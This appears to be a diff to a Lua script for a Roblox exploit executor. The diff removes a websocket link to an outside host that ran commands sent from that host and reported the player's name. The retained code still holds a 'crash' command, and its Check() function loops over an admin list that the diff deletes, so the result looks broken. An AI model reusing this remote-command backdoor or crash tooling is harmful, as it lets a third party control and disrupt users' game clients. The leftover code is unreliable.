@@ -22,10 +22,7 @@ for Index, String in pairs(EidList) do
         Eid = Headers[String]
     end
 end
-local WebSocket = syn.websocket.connect("wss://ael-admin.glitch.me/") or WebSocket.connect("wss://ael-admin.glitch.me/")
-local Admins = {
-    "e65bc6d4b713a67b591b5cd4d52cc423ec04c6874a73ab8ac9f9f6fc04eeb566b52086097b262cb6867b6da55556db9035d74e0cbd87d2fce555c8bab14814e7"
-}
+
 local Commands = {
     ["crash"] = function()
         task.spawn(function()
@@ -49,10 +46,7 @@ local Commands = {
         end
     end
 }
-WebSocket.OnMessage:Connect(function(Message)
-    local MessageTable = Message:lower():gsub("!", ""):split(" ")
-    Commands[MessageTable[1]]()
-end)
+
 function Check()
     for Index, String in pairs(Admins) do
         if String == Eid then
@@ -74,4 +68,3 @@ if Check() then
         ["Title"] = "Commands Loaded"
     })
 end
-WebSocket:Send("!setclient " .. game.Players.LocalPlayer.Name)
